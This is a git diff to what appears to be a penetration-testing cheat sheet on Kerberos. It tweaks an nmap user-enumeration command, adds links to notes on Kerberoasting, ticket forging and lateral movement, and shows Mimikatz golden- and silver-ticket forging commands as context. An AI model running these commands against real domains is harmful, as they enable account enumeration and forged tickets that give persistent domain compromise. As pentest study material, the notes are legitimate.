@@ -19,7 +19,7 @@
 
 ```shell
 # Nmap Kerberos enum
-nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=$domain,userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt $rhost
+nmap -p 88 --script "krb5-enum-users" --script-args krb5-enum-users.realm=$domain,userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt $rhost
 ```
 
 ### User Enumeration (One-liner)
@@ -138,3 +138,12 @@ kerberos::golden /user:Administrator /domain:$domain /sid:$domain_sid /krbtgt:$k
 # Requires service account NTLM hash
 kerberos::golden /user:Administrator /domain:$domain /sid:$domain_sid /target:$rhost /service:cifs /rc4:$service_hash /ptt
 ```
+---
+
+## See Also
+
+- **[Kerberos Attacks](../../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Kerberoasting, ASREPRoast, Golden/Silver Tickets
+- **[AD Exploitation](../../3.AD-Exploit/3.1.AD-Exploitation.md)** - Full AD attack methodology
+- **[Kerberos Delegation](../../3.AD-Exploit/3.7.Kerberos-Delegation.md)** - Unconstrained/Constrained delegation attacks
+- **[Lateral Movement](../../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Pass-the-Ticket, Overpass-the-Hash
+- **[LDAP](389-636-3268-3269-ldap.md)** - AD enumeration via LDAP
